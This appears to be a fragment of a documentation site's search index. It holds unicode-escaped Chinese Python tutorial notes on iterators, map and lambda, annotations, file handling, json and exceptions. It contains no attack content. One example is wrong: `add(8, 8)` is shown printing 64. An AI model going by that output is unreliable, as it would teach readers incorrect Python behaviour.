\u8fed\u4ee3\u5668\u5bf9\u8c61\u4ece\u96c6\u5408\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5f00\u59cb\u8bbf\u95ee\uff0c\u76f4\u5230\u6240\u6709\u7684\u5143\u7d20\u88ab\u8bbf\u95ee\u5b8c\u7ed3\u675f\u3002\u8fed\u4ee3\u5668\u53ea\u80fd\u5f80\u524d\u4e0d\u4f1a\u540e\u9000\u3002 \u8fed\u4ee3\u5668\u6709\u4e24\u4e2a\u57fa\u672c\u7684\u65b9\u6cd5\uff1aiter()\u548cnext() \u53ef\u4ee5\u76f4\u63a5\u4f5c\u7528\u4e8efbr\u5faa\u73af\u7684\u5bf9\u8c61\u662f\u53ef\u8fed\u4ee3\u7684(Iterable)\u5bf9\u8c61\u3002\u5b57\u7b26\u4e32\u3001\u5217\u8868\u3001\u5b57\u5178\u3001\u96c6\u5408\u6216\u5143\u7ec4 \u5bf9\u8c61\u90fd\u662f\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff0c\u90fd\u53ef\u7528\u4e8e\u521b\u5efa\u8fed\u4ee3\u5668\u3002\u53e6\u5916\uff0c\u751f\u6210\u5668(generator)\u4e5f\u5c5e\u4e8e\u53ef\u8fed\u4ee3\u5bf9\u8c61\u3002\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u662f\u8fed\u4ee3\u5668\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u80af\u5b9a\u662f\u53ef\u8fed\u4ee3\u7684\uff1b\u4f46\u662f\u53cd\u8fc7\u6765\uff0c\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u662f\u53ef\u8fed\u4ee3\u7684, \u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u4e0d\u4e00\u5b9a\u662f\u8fed\u4ee3\u5668\u3002\u5982\u4f55\u77e5\u9053\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u53ef\u8fed\u4ee3\u5462\uff1f\u65b9\u6cd5\u662f\u901a\u8fc7collections\u6a21\u5757\u7684 Iterable\u7c7b\u578b\u5224\u65ad from collections import Iterable print(isinstance('abc',Iterable)) # str \u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance([1,2,3],Iterable)) # list \u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance(123,Iterable)) # \u6574\u6570\u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance((1,2),Iterable)) # \u5143\u7ec4\u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance({1,2},Iterable)) # \u96c6\u5408\u662f\u5426\u53ef\u8fed\u4ee3 \u8fd0\u884c\u7ed3\u679c: True True False True True \u4e0b\u9762\u4f7f\u7528list\u6765\u521b\u5efa\u4e00\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff1a list=[1,2,3,4] it=iter(list) #\u521b\u5efa\u8fed\u4ee3\u5668\u5bf9\u8c61 for x in it: print (x, end=\"\") \u8fd0\u884c\u7ed3\u679c\uff1a 1234 \u5b9a\u4e49\u4e00\u4e2a __iter__() \u65b9\u6cd5\u6765\u8fd4\u56de\u4e00\u4e2a\u5e26\u6709 [ __next__() ] \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002 \u5982\u679c\u7c7b\u5df2\u5b9a\u4e49\u4e86 __next__() \uff0c\u5219 __iter__() \u53ef\u4ee5\u7b80\u5355\u5730\u8fd4\u56de self : class Reverse: \"\"\"Iterator for looping over a sequence backwards.\"\"\" def __init__(self, data): self.data = data self.index = len(data) def __iter__(self): return self def __next__(self): if self.index == 0: raise StopIteration self.index = self.index - 1 return self.data[self.index] >>> >>> rev = Reverse('spam') >>> iter(rev) <__main__.Reverse object at 0x00A1DB50> >>> for char in rev: ... print(char) ... m a p s","title":"python\u8fed\u4ee3\u5668"},{"location":"programming_language/python/%E8%BF%AD%E4%BB%A3%E5%99%A8/#pythoniterator","text":"\u8fed\u4ee3\u662fPython\u6700\u5f3a\u5927\u7684\u529f\u80fd\u4e4b\u4e00\uff0c\u662f\u5e38\u7528\u7684\u8bbf\u95ee\u96c6\u5408\u5143\u7d20\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u53ef\u4ee5\u88abnext()\u51fd\u6570\u8c03\u7528\u5e76\u4e0d\u65ad\u8fd4\u56de\u4e0b\u4e00\u4e2a\u503c\u7684\u5bf9\u8c61\u3002\u8fed\u4ee3\u5668\u662f\u4e00\u4e2a\u53ef\u4ee5\u8bb0\u4f4f\u904d\u5386\u7684\u4f4d\u7f6e\u7684\u5bf9\u8c61\u3002Iterator\u5bf9\u8c61\u8868\u793a\u7684\u662f\u4e00\u4e2a\u6570\u636e\u6d41\uff0c \u53ef\u4ee5\u88ab\u770b\u4f5c\u4e3a\u4e00\u4e2a\u6709\u5e8f\u5e8f\u5217\uff0c\u4f46\u662f\u4e0d\u80fd\u63d0\u524d\u5f97\u5230\u5b83\u7684\u957f\u5ea6\uff0c\u53ea\u6709\u5728\u9700\u8981\u8fd4\u56de\u4e0b\u4e00\u4e2a\u6570\u636e\u65f6\u5b83\u624d\u4f1a\u8ba1\u7b97\uff0c \u5b83\u53ef\u4ee5\u88abnext()\u3002\u51fd\u6570\u8c03\u7528\u5e76\u4e0d\u65ad\u8fd4\u56de\u4e0b\u4e00\u4e2a\u6570\u636e\uff0c\u76f4\u5230\u6ca1\u6709\u6570\u636e\u65f6\u629b\u51faStopiteration\u9519\u8bef\u3002 \u8fed\u4ee3\u5668\u6709\u4ee5\u4e0b\u51e0\u4e2a\u7279\u70b9\uff1a \u8fed\u4ee3\u5668\u5bf9\u8c61\u4ece\u96c6\u5408\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5f00\u59cb\u8bbf\u95ee\uff0c\u76f4\u5230\u6240\u6709\u7684\u5143\u7d20\u88ab\u8bbf\u95ee\u5b8c\u7ed3\u675f\u3002\u8fed\u4ee3\u5668\u53ea\u80fd\u5f80\u524d\u4e0d\u4f1a\u540e\u9000\u3002 \u8fed\u4ee3\u5668\u6709\u4e24\u4e2a\u57fa\u672c\u7684\u65b9\u6cd5\uff1aiter()\u548cnext() \u53ef\u4ee5\u76f4\u63a5\u4f5c\u7528\u4e8efbr\u5faa\u73af\u7684\u5bf9\u8c61\u662f\u53ef\u8fed\u4ee3\u7684(Iterable)\u5bf9\u8c61\u3002\u5b57\u7b26\u4e32\u3001\u5217\u8868\u3001\u5b57\u5178\u3001\u96c6\u5408\u6216\u5143\u7ec4 \u5bf9\u8c61\u90fd\u662f\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff0c\u90fd\u53ef\u7528\u4e8e\u521b\u5efa\u8fed\u4ee3\u5668\u3002\u53e6\u5916\uff0c\u751f\u6210\u5668(generator)\u4e5f\u5c5e\u4e8e\u53ef\u8fed\u4ee3\u5bf9\u8c61\u3002\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u662f\u8fed\u4ee3\u5668\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u80af\u5b9a\u662f\u53ef\u8fed\u4ee3\u7684\uff1b\u4f46\u662f\u53cd\u8fc7\u6765\uff0c\u5982\u679c\u4e00\u4e2a\u5bf9\u8c61\u662f\u53ef\u8fed\u4ee3\u7684, \u90a3\u4e48\u8fd9\u4e2a\u5bf9\u8c61\u4e0d\u4e00\u5b9a\u662f\u8fed\u4ee3\u5668\u3002\u5982\u4f55\u77e5\u9053\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u53ef\u8fed\u4ee3\u5462\uff1f\u65b9\u6cd5\u662f\u901a\u8fc7collections\u6a21\u5757\u7684 Iterable\u7c7b\u578b\u5224\u65ad from collections import Iterable print(isinstance('abc',Iterable)) # str \u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance([1,2,3],Iterable)) # list \u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance(123,Iterable)) # \u6574\u6570\u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance((1,2),Iterable)) # \u5143\u7ec4\u662f\u5426\u53ef\u8fed\u4ee3 print(isinstance({1,2},Iterable)) # \u96c6\u5408\u662f\u5426\u53ef\u8fed\u4ee3 \u8fd0\u884c\u7ed3\u679c: True True False True True \u4e0b\u9762\u4f7f\u7528list\u6765\u521b\u5efa\u4e00\u4e2a\u53ef\u8fed\u4ee3\u5bf9\u8c61\uff1a list=[1,2,3,4] it=iter(list) #\u521b\u5efa\u8fed\u4ee3\u5668\u5bf9\u8c61 for x in it: print (x, end=\"\") \u8fd0\u884c\u7ed3\u679c\uff1a 1234 \u5b9a\u4e49\u4e00\u4e2a __iter__() \u65b9\u6cd5\u6765\u8fd4\u56de\u4e00\u4e2a\u5e26\u6709 [ __next__() ] \u65b9\u6cd5\u7684\u5bf9\u8c61\u3002 \u5982\u679c\u7c7b\u5df2\u5b9a\u4e49\u4e86 __next__() \uff0c\u5219 __iter__() \u53ef\u4ee5\u7b80\u5355\u5730\u8fd4\u56de self : class Reverse: \"\"\"Iterator for looping over a sequence backwards.\"\"\" def __init__(self, data): self.data = data self.index = len(data) def __iter__(self): return self def __next__(self): if self.index == 0: raise StopIteration self.index = self.index - 1 return self.data[self.index] >>> >>> rev = Reverse('spam') >>> iter(rev) <__main__.Reverse object at 0x00A1DB50> >>> for char in rev: ... print(char) ... m a p s","title":"Python\u7684\u8fed\u4ee3\u5668(Iterator)"},{"location":"programming_language/python/%E8%BF%AD%E4%BB%A3%E5%99%A8/#_1","text":"","title":""},{"location":"programming_language/python/basics/basic/","text":"python3.9.6 map\u51fd\u6570 def sq(x): return x * x print(list(map(sq, [1, 2, 3, 4, 5]))) \u7ed3\u679c\uff1a [1, 4, 9, 16, 25] lambda\u51fd\u6570 \u4f8b1\uff1a def sq(x): return x * x print(list(map(lambda x: x*x,[y for y in range(6)]))) \u7ed3\u679c\uff1a [0, 1, 4, 9, 16, 25] \u4f8b2\uff1a funca = lambda x, y, z: (x + 8) * y - z print(funca(5, 6, 8)) \u7ed3\u679c\uff1a 70 -> \u7684\u7528\u6cd5 -> \u5e38\u5e38\u51fa\u73b0\u5728python\u51fd\u6570\u5b9a\u4e49\u7684\u51fd\u6570\u540d\u540e\u9762\uff0c\u4e3a\u51fd\u6570\u6dfb\u52a0 \u5143\u6570\u636e ,\u63cf\u8ff0\u51fd\u6570\u7684\u8fd4\u56de\u7c7b\u578b def add(a: int, b: int) -> int: return a + b print(add.__annotations__) result = add(8, 8) print(result) \u7ed3\u679c\uff1a {'a': <class 'int'>, 'b': <class 'int'>, 'return': <class 'int'>} 64 _ _annotations ____ \u7684\u7528\u6cd5 \u4ee5\u5b57\u5178\u7684\u5f62\u5f0f\u5b58\u653e\u5728\u51fd\u6570\u7684 __annotations__ \u5c5e\u6027\u4e2d\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5f71\u54cd\u51fd\u6570\u7684\u4efb\u4f55\u5176\u4ed6\u90e8\uff0c\u6253\u5370\u51fd\u6570\u7684\u6807\u6ce8 https://docs.python.org/zh-cn/3/tutorial/controlflow.html def f(ham: str, eggs: str = 'eggs') -> str: print(\"Annotations:\", f.__annotations__) print(\"Arguments:\", ham, eggs) return ham + ' and ' + eggs g = f('spam') print(g) \u7ed3\u679c\uff1a Annotations: {'ham': <class 'str'>, 'eggs': <class 'str'>, 'return': <class 'str'>} Arguments: spam eggs spam and eggs import * \u7684\u95ee\u9898 >>> from fibo import * >>> fib(500) 0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 \u8fd9\u79cd\u65b9\u5f0f\u4f1a\u5bfc\u5165\u6240\u6709\u4e0d\u4ee5\u4e0b\u5212\u7ebf\uff08 _ \uff09\u5f00\u5934\u7684\u540d\u79f0\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4e0d\u8981\u7528\u8fd9\u4e2a\u529f\u80fd\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5411\u89e3\u91ca\u5668\u5bfc\u5165\u4e86\u4e00\u6279\u672a\u77e5\u7684\u540d\u79f0\uff0c\u53ef\u80fd\u4f1a\u8986\u76d6\u5df2\u7ecf\u5b9a\u4e49\u7684\u540d\u79f0\u3002 \u6ce8\u610f\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e0d\u5efa\u8bae\u4ece\u6a21\u5757\u6216\u5305\u5185\u5bfc\u5165 * \uff0c \u56e0\u4e3a\uff0c\u8fd9\u9879\u64cd\u4f5c\u7ecf\u5e38\u8ba9\u4ee3\u7801\u53d8\u5f97\u96be\u4ee5\u7406\u89e3\u3002\u4e0d\u8fc7\uff0c\u4e3a\u4e86\u5728\u4ea4\u4e92\u5f0f\u7f16\u8bd1\u5668\u4e2d\u5c11\u6253\u51e0\u4e2a\u5b57\uff0c\u8fd9\u4e48\u7528\u4e5f\u6ca1\u95ee\u9898\u3002 \u53e6\u5916\u4ece\u5305\u5bfc\u5165*\uff0c\u6709\u4e2a\u7d22\u5f15\u95ee\u9898 https://docs.python.org/zh-cn/3/tutorial/modules.html#importing-from-a-package with\u5173\u952e\u5b57 >>> with open('workfile') as f: ... read_data = f.read() >>> # We can check that the file has been automatically closed. >>> f.closed True \u5982\u679c\u6ca1\u6709\u4f7f\u7528 [ with ]\u5173\u952e\u5b57\uff0c\u5219\u5e94\u8c03\u7528 f.close() \u5173\u95ed\u6587\u4ef6\uff0c\u5373\u53ef\u91ca\u653e\u6587\u4ef6\u5360\u7528\u7684\u7cfb\u7edf\u8d44\u6e90\u3002 \u8c03\u7528 f.write() \u65f6\uff0c\u672a\u4f7f\u7528 with \u5173\u952e\u5b57\uff0c\u6216\u672a\u8c03\u7528 f.close() \uff0c\u5373\u4f7f\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\uff0c\u4e5f \u53ef\u80fd \u5bfc\u81f4 f.write() \u7684\u53c2\u6570\u6ca1\u6709\u5b8c\u5168\u5199\u5165\u78c1\u76d8\u3002 \u901a\u8fc7 [ with ] \u8bed\u53e5\uff0c\u6216\u8c03\u7528 f.close() \u5173\u95ed\u6587\u4ef6\u5bf9\u8c61\u540e\uff0c\u518d\u6b21\u4f7f\u7528\u8be5\u6587\u4ef6\u5bf9\u8c61\u5c06\u4f1a\u5931\u8d25\u3002 >>> >>> f.close() >>> f.read() Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: I/O operation on closed file. \u6587\u4ef6\u8bfb\u53d6\u591a\u884c \u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u591a\u884c\u65f6\uff0c\u53ef\u4ee5\u7528\u5faa\u73af\u904d\u5386\u6574\u4e2a\u6587\u4ef6\u5bf9\u8c61\u3002\u8fd9\u79cd\u64cd\u4f5c\u80fd\u9ad8\u6548\u5229\u7528\u5185\u5b58\uff0c\u5feb\u901f\uff0c\u4e14\u4ee3\u7801\u7b80\u5355\uff1a >>> >>> for line in f: ... print(line, end='') ... This is the first line of the file. Second line of the file \u5982\u9700\u4ee5\u5217\u8868\u5f62\u5f0f\u8bfb\u53d6\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u884c\uff0c\u53ef\u4ee5\u7528 list(f) \u6216 f.readlines() \u3002 \u64cd\u4f5c\u6587\u672cseek f.seek(offset, whence) \u53ef\u4ee5\u6539\u53d8\u6587\u4ef6\u5bf9\u8c61\u7684\u4f4d\u7f6e\u3002\u901a\u8fc7\u5411\u53c2\u8003\u70b9\u6dfb\u52a0 offset \u8ba1\u7b97\u4f4d\u7f6e\uff1b\u53c2\u8003\u70b9\u7531 whence \u53c2\u6570\u6307\u5b9a\u3002 whence \u503c\u4e3a 0 \u65f6\uff0c\u8868\u793a\u4ece\u6587\u4ef6\u5f00\u5934\u8ba1\u7b97\uff0c1 \u8868\u793a\u4f7f\u7528\u5f53\u524d\u6587\u4ef6\u4f4d\u7f6e\uff0c2 \u8868\u793a\u4f7f\u7528\u6587\u4ef6\u672b\u5c3e\u4f5c\u4e3a\u53c2\u8003\u70b9\u3002\u7701\u7565 whence \u65f6\uff0c\u5176\u9ed8\u8ba4\u503c\u4e3a 0\uff0c\u5373\u4f7f\u7528\u6587\u4ef6\u5f00\u5934\u4f5c\u4e3a\u53c2\u8003\u70b9\u3002 >>> >>> f = open('workfile', 'rb+') >>> f.write(b'0123456789abcdef') 16 >>> f.seek(5) # Go to the 6th byte in the file 5 >>> f.read(1) b'5' >>> f.seek(-3, 2) # Go to the 3rd byte before the end 13 >>> f.read(1) b'd' \u5728\u6587\u672c\u6587\u4ef6\uff08\u6a21\u5f0f\u5b57\u7b26\u4e32\u672a\u4f7f\u7528 b \u65f6\u6253\u5f00\u7684\u6587\u4ef6\uff09\u4e2d\uff0c\u53ea\u5141\u8bb8\u76f8\u5bf9\u4e8e\u6587\u4ef6\u5f00\u5934\u641c\u7d22\uff08\u4f7f\u7528 seek(0, 2) \u641c\u7d22\u5230\u6587\u4ef6\u672b\u5c3e\u662f\u4e2a\u4f8b\u5916\uff09\uff0c\u552f\u4e00\u6709\u6548\u7684 offset \u503c\u662f\u80fd\u4ece f.tell() \u4e2d\u8fd4\u56de\u7684\uff0c\u6216 0\u3002\u5176\u4ed6 offset \u503c\u90fd\u4f1a\u4ea7\u751f\u672a\u5b9a\u4e49\u7684\u884c\u4e3a\u3002 \u6587\u4ef6\u5bf9\u8c61\u8fd8\u652f\u6301 isatty() \u548c truncate() \u7b49\u65b9\u6cd5\uff0c\u4f46\u4e0d\u5e38\u7528\uff1b\u6587\u4ef6\u5bf9\u8c61\u7684\u5b8c\u6574\u6307\u5357\u8be6\u89c1\u5e93\u53c2\u8003\u3002 \u64cd\u4f5cjson Python \u652f\u6301 JSON (JavaScript Object Notation) \u8fd9\u79cd\u6d41\u884c\u6570\u636e\u4ea4\u6362\u683c\u5f0f\uff0c\u7528\u6237\u65e0\u9700\u6ca1\u5b8c\u6ca1\u4e86\u5730\u7f16\u5199\u3001\u8c03\u8bd5\u4ee3\u7801\uff0c\u624d\u80fd\u628a\u590d\u6742\u7684\u6570\u636e\u7c7b\u578b\u4fdd\u5b58\u5230\u6587\u4ef6\u3002[ json ] \u6807\u51c6\u6a21\u5757\u91c7\u7528 Python \u6570\u636e\u5c42\u6b21\u7ed3\u6784\uff0c\u5e76\u5c06\u4e4b\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f\uff1b\u8fd9\u4e2a\u8fc7\u7a0b\u79f0\u4e3a serializing \uff08\u5e8f\u5217\u5316\uff09\u3002\u4ece\u5b57\u7b26\u4e32\u8868\u793a\u4e2d\u91cd\u5efa\u6570\u636e\u79f0\u4e3a deserializing \uff08\u89e3\u5e8f\u5316\uff09\u3002\u5728\u5e8f\u5217\u5316\u548c\u89e3\u5e8f\u5316\u4e4b\u95f4\uff0c\u8868\u793a\u5bf9\u8c61\u7684\u5b57\u7b26\u4e32\u53ef\u80fd\u5df2\u7ecf\u5b58\u50a8\u5728\u6587\u4ef6\u6216\u6570\u636e\u4e2d\uff0c\u6216\u901a\u8fc7\u7f51\u7edc\u8fde\u63a5\u53d1\u9001\u5230\u8fdc\u65b9 \u7684\u673a\u5668\u3002 \u6ce8\u89e3 JSON \u683c\u5f0f\u901a\u5e38\u7528\u4e8e\u73b0\u4ee3\u5e94\u7528\u7a0b\u5e8f\u7684\u6570\u636e\u4ea4\u6362\u3002\u7a0b\u5e8f\u5458\u65e9\u5df2\u5bf9\u5b83\u8033\u719f\u80fd\u8be6\uff0c\u53ef\u8c13\u662f\u4ea4\u4e92\u64cd\u4f5c\u7684\u4e0d\u4e8c\u4e4b\u9009\u3002 \u53ea\u9700\u4e00\u884c\u7b80\u5355\u7684\u4ee3\u7801\u5373\u53ef\u67e5\u770b\u67d0\u4e2a\u5bf9\u8c61\u7684 JSON \u5b57\u7b26\u4e32\u8868\u73b0\u5f62\u5f0f\uff1a >>> >>> import json >>> x = [1, 'simple', 'list'] >>> json.dumps(x) '[1, \"simple\", \"list\"]' [ dumps() ] \u51fd\u6570\u8fd8\u6709\u4e00\u4e2a\u53d8\u4f53\uff0c [ dump() ]\uff0c\u5b83\u53ea\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\u4e3a text file \u3002\u56e0\u6b64\uff0c\u5982\u679c f \u662f text file \u5bf9\u8c61\uff0c\u53ef\u4ee5\u8fd9\u6837\u505a\uff1a json.dump(x, f) \u8981\u518d\u6b21\u89e3\u7801\u5bf9\u8c61\uff0c\u5982\u679c f \u662f\u5df2\u6253\u5f00\u3001\u4f9b\u8bfb\u53d6\u7684 text file \u5bf9\u8c61\uff1a x = json.load(f) \u8fd9\u79cd\u7b80\u5355\u7684\u5e8f\u5217\u5316\u6280\u672f\u53ef\u4ee5\u5904\u7406\u5217\u8868\u548c\u5b57\u5178\uff0c\u4f46\u5728 JSON \u4e2d\u5e8f\u5217\u5316\u4efb\u610f\u7c7b\u7684\u5b9e\u4f8b\uff0c\u5219\u9700\u8981\u4ed8\u51fa\u989d\u5916\u52aa\u529b\u3002[ json ] \u6a21\u5757\u7684\u53c2\u8003\u5305\u542b\u5bf9\u6b64\u7684\u89e3\u91ca\u3002 \u53e5\u6cd5\u9519\u8bef \u53e5\u6cd5\u9519\u8bef\u53c8\u79f0\u89e3\u6790\u9519\u8bef\uff0c\u662f\u5b66\u4e60 Python \u65f6\u6700\u5e38\u89c1\u7684\u9519\u8bef\uff1a >>> >>> while True print('Hello world') File \"<stdin>\", line 1 while True print('Hello world') ^ SyntaxError: invalid syntax \u89e3\u6790\u5668\u4f1a\u590d\u73b0\u51fa\u73b0\u53e5\u6cd5\u9519\u8bef\u7684\u4ee3\u7801\u884c\uff0c\u5e76\u7528\u5c0f\u201c\u7bad\u5934\u201d\u6307\u5411\u884c\u91cc\u68c0\u6d4b\u5230\u7684\u7b2c\u4e00\u4e2a\u9519\u8bef\u3002\u9519\u8bef\u662f\u7531\u7bad\u5934 \u4e0a\u65b9 \u7684 token \u89e6\u53d1\u7684\uff08\u81f3\u5c11\u662f\u5728\u8fd9\u91cc\u68c0\u6d4b\u51fa\u7684\uff09\uff1a\u672c\u4f8b\u4e2d\uff0c\u5728 [ print() ]\u51fd\u6570\u4e2d\u68c0\u6d4b\u5230\u9519\u8bef\uff0c\u56e0\u4e3a\uff0c\u5728\u5b83\u524d\u9762\u7f3a\u5c11\u5192\u53f7\uff08 ':' \uff09 \u3002\u9519\u8bef\u4fe1\u606f\u8fd8\u8f93\u51fa\u6587\u4ef6\u540d\u4e0e\u884c\u53f7\uff0c\u5728\u4f7f\u7528\u811a\u672c\u6587\u4ef6\u65f6\uff0c\u5c31\u53ef\u4ee5\u77e5\u9053\u53bb\u54ea\u91cc\u67e5\u9519\u3002 \u89e6\u53d1\u5f02\u5e38 [ raise ] \u8bed\u53e5\u652f\u6301\u5f3a\u5236\u89e6\u53d1\u6307\u5b9a\u7684\u5f02\u5e38\u3002\u4f8b\u5982\uff1a >>> >>> raise NameError('HiThere') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> NameError: HiThere [ raise ] \u552f\u4e00\u7684\u53c2\u6570\u5c31\u662f\u8981\u89e6\u53d1\u7684\u5f02\u5e38\u3002\u8fd9\u4e2a\u53c2\u6570\u5fc5\u987b\u662f\u5f02\u5e38\u5b9e\u4f8b\u6216\u5f02\u5e38\u7c7b\uff08\u6d3e\u751f\u81ea [ Exception ] \u7c7b\uff09\u3002\u5982\u679c\u4f20\u9012\u7684\u662f\u5f02\u5e38\u7c7b\uff0c\u5c06\u901a\u8fc7\u8c03\u7528\u6ca1\u6709\u53c2\u6570\u7684\u6784\u9020\u51fd\u6570\u6765\u9690\u5f0f\u5b9e\u4f8b\u5316\uff1a raise ValueError # shorthand for 'raise ValueError()' \u5982\u679c\u53ea\u60f3\u5224\u65ad\u662f\u5426\u89e6\u53d1\u4e86\u5f02\u5e38\uff0c\u4f46\u5e76\u4e0d\u6253\u7b97\u5904\u7406\u8be5\u5f02\u5e38\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u66f4\u7b80\u5355\u7684 [ raise ]\u8bed\u53e5\u91cd\u65b0\u89e6\u53d1\u5f02\u5e38\uff1a >>> >>> try: ... raise NameError('HiThere') ... except NameError: ... print('An exception flew by!') ... raise ... An exception flew by! Traceback (most recent call last): File \"<stdin>\", line 2, in <module> NameError: HiThere \u5f02\u5e38\u94fe [ raise ] \u8bed\u53e5\u652f\u6301\u53ef\u9009\u7684 [ from ]\u5b50\u53e5\uff0c\u8be5\u5b50\u53e5\u7528\u4e8e\u542f\u7528\u94fe\u5f0f\u5f02\u5e38\u3002 \u4f8b\u5982\uff1a # exc must be exception instance or None. raise RuntimeError from exc \u8f6c\u6362\u5f02\u5e38\u65f6\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5f88\u6709\u7528\u3002\u4f8b\u5982\uff1a >>> >>> def func(): ... raise ConnectionError ... >>> try: ... func() ... except ConnectionError as exc: ... raise RuntimeError('Failed to open database') from exc ... Traceback (most recent call last): File \"<stdin>\", line 2, in <module> File \"<stdin>\", line 2, in func ConnectionError The above exception was the direct cause of the following exception: Traceback (most recent call last): File \"<stdin>\", line 4, in <module> RuntimeError: Failed to open database \u5f02\u5e38\u94fe\u4f1a\u5728 [ except ]\u6216 [ finally ] \u5b50\u53e5\u5185\u90e8\u5f15\u53d1\u5f02\u5e38\u65f6\u81ea\u52a8\u751f\u6210\u3002 \u8fd9\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 from None \u8fd9\u6837\u7684\u5199\u6cd5\u6765\u7981\u7528: >>> >>> try: ... open('database.sqlite') ... except OSError: ... raise RuntimeError from None ... Traceback (most recent call last): File \"<stdin>\", line 4, in <module> RuntimeError \u5f02\u5e38\u94fe\u673a\u5236\u8be6\u89c1 \u5185\u7f6e\u5f02\u5e38 \u3002 \u7c7b\u7684\u6784\u9020\u51fd\u6570 \u5f53\u7136\uff0c __init__() \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u6709\u989d\u5916\u53c2\u6570\u4ee5\u5b9e\u73b0\u66f4\u9ad8\u7075\u6d3b\u6027\u3002 \u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u63d0\u4f9b\u7ed9\u7c7b\u5b9e\u4f8b\u5316\u8fd0\u7b97\u7b26\u7684\u53c2\u6570\u5c06\u88ab\u4f20\u9012\u7ed9 __init__() \u3002 \u4f8b\u5982\uff0c: >>> >>> class Complex: ... def __init__(self, realpart, imagpart): ... self.r = realpart ... self.i = imagpart ... >>> x = Complex(3.0, -4.5) >>> x.r, x.i (3.0, -4.5) \u7c7b\u4e2d\u79c1\u6709\u53d8\u91cf class A(object): def __init__(self): self.__data = [] # \u7ffb\u8bd1\u6210 self._A__data=[] def add(self, item): self.__data.append(item) # \u7ffb\u8bd1\u6210 self._A__data.append(item) def printData(self): print(self.__data) # \u7ffb\u8bd1\u6210 self._A__data a = A() a.add('hello') a.add('python') a.printData() # print a.__data #\u5916\u754c\u4e0d\u80fd\u8bbf\u95ee\u79c1\u6709\u53d8\u91cf AttributeError: 'A' object has no attribute '__data' print(a._A__data) # \u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5728\u5916\u9762\u4e5f\u80fd\u591f\u8bbf\u95ee\u201c\u79c1\u6709\u201d\u53d8\u91cf\uff1b\u8fd9\u4e00\u70b9\u5728\u8c03\u8bd5\u4e2d\u662f\u6bd4\u8f83\u6709\u7528\u7684\uff01 \u7ed3\u679c\uff1a ['hello', 'python'] ['hello', 'python'] \u8fed\u4ee3\u5668 \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u60a8\u53ef\u80fd\u5df2\u7ecf\u6ce8\u610f\u5230\u5927\u591a\u6570\u5bb9\u5668\u5bf9\u8c61\u90fd\u53ef\u4ee5\u4f7f\u7528 [ for ] \u8bed\u53e5: for element in [1, 2, 3]: print(element) for element in (1, 2, 3): print(element) for key in {'one':1, 'two':2}: print(key) for char in \"123\": print(char) for line in open(\"myfile.txt\"): print(line, end='') \u8fd9\u79cd\u8bbf\u95ee\u98ce\u683c\u6e05\u6670\u3001\u7b80\u6d01\u53c8\u65b9\u4fbf\u3002 \u8fed\u4ee3\u5668\u7684\u4f7f\u7528\u975e\u5e38\u666e\u904d\u5e76\u4f7f\u5f97 Python \u6210\u4e3a\u4e00\u4e2a\u7edf\u4e00\u7684\u6574\u4f53\u3002 \u5728\u5e55\u540e\uff0c[ for ]\u8bed\u53e5\u4f1a\u5728\u5bb9\u5668\u5bf9\u8c61\u4e0a\u8c03\u7528 [ iter() ]\u3002 \u8be5\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5b9a\u4e49\u4e86 [ __next__() ] \u65b9\u6cd5\u7684\u8fed\u4ee3\u5668\u5bf9\u8c61\uff0c\u6b64\u65b9\u6cd5\u5c06\u9010\u4e00\u8bbf\u95ee\u5bb9\u5668\u4e2d\u7684\u5143\u7d20\u3002 \u5f53\u5143\u7d20\u7528\u5c3d\u65f6\uff0c[ __next__() ] \u5c06\u5f15\u53d1 [ StopIteration ] \u5f02\u5e38\u6765\u901a\u77e5\u7ec8\u6b62 for \u5faa\u73af\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528 [ next() ] \u5185\u7f6e\u51fd\u6570\u6765\u8c03\u7528 [ __next__() ]\u65b9\u6cd5\uff1b\u8fd9\u4e2a\u4f8b\u5b50\u663e\u793a\u4e86\u5b83\u7684\u8fd0\u4f5c\u65b9\u5f0f: >>> >>> s = 'abc' >>> it = iter(s) >>> it <iterator object at 0x00A1DB50> >>> next(it) 'a' >>> next(it) 'b' >>> next(it) 'c' >>> next(it) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> next(it) StopIteration 